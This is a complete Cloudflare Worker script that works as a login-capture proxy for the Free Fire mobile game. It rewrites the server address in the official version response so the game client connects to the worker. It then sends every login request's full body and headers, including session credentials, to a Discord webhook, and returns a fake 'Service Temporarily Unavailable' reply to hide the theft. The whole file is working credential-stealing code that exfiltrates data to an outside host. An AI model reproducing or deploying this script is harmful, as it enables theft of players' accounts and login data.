export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname.toLowerCase();

    // ====================== VERSION ENDPOINT ======================
    if (path.includes("ver.php") || path.includes("/live/ver") || path.endsWith("/ver")) {
      try {
        const officialUrl = new URL("https://version.ggwhitehawk.com/live/ver.php");
        url.searchParams.forEach((value, key) => {
          officialUrl.searchParams.set(key, value);
        });

        const officialRes = await fetch(officialUrl.toString(), {
          method: "GET",
          headers: {
            "User-Agent": request.headers.get("User-Agent") || "UnityPlayer/2018.4.12f1",
            "Accept": "*/*",
          },
        });

        let data = await officialRes.json();
        const myBaseUrl = `https://${url.host}/`;
        data.server_url = myBaseUrl;
        if (data.serverUrl) data.serverUrl = myBaseUrl;

        return new Response(JSON.stringify(data), {
          status: 200,
          headers: { "Content-Type": "application/json" },
        });
      } catch (err) {
        return new Response(JSON.stringify({ error: err.message }), { status: 500 });
      }
    }

    // ====================== MAJOR LOGIN CAPTURE ======================
    if (path.includes("majorlogin") || request.method === "POST") {
      try {
        const bodyBuffer = await request.arrayBuffer();
        const bodyBytes = new Uint8Array(bodyBuffer);
        const hexBody = Array.from(bodyBytes)
          .map(b => b.toString(16).padStart(2, "0"))
          .join("");

        const headersObj = Object.fromEntries(request.headers);
        const webhook = env.DISCORD_WEBHOOK;

        if (webhook) {
          // Create the text file content
          const fileContent = 
`Free Fire MajorLogin Capture
==============================
Time: ${new Date().toISOString()}
Method: ${request.method}
Path: ${url.pathname}
Body Size: ${bodyBytes.length} bytes

Headers:
${JSON.stringify(headersObj, null, 2)}

Full Hex Body:
${hexBody}
`;

          // Prepare multipart form
          const form = new FormData();

          // Message + embed
          form.append("payload_json", JSON.stringify({
            content: "**Free Fire MajorLogin Captured**",
            embeds: [{
              title: "Login Request Details",
              color: 5763719,
              fields: [
                { name: "Method + Path", value: `\`${request.method} ${url.pathname}\`` },
                { name: "Body Size", value: `${bodyBytes.length} bytes`, inline: true },
                { name: "Time", value: new Date().toISOString(), inline: true },
              ],
              footer: { text: "Full hex is attached as .txt file" }
            }]
          }));

          // Attach the .txt file
          form.append(
            "files[0]",
            new Blob([fileContent], { type: "text/plain" }),
            `majorlogin_${Date.now()}.txt`
          );

          // Send to Discord
          await fetch(webhook, {
            method: "POST",
            body: form
          });
        }
      } catch (e) {
        console.log("Capture error:", e);
      }

      // Return safe error
      return new Response("Service Temporarily Unavailable", {
        status: 503,
        headers: {
          "Content-Type": "text/plain",
          "Retry-After": "1800"
        }
      });
    }

    return new Response("FF Capture Worker Online", { status: 200 });
  }
};
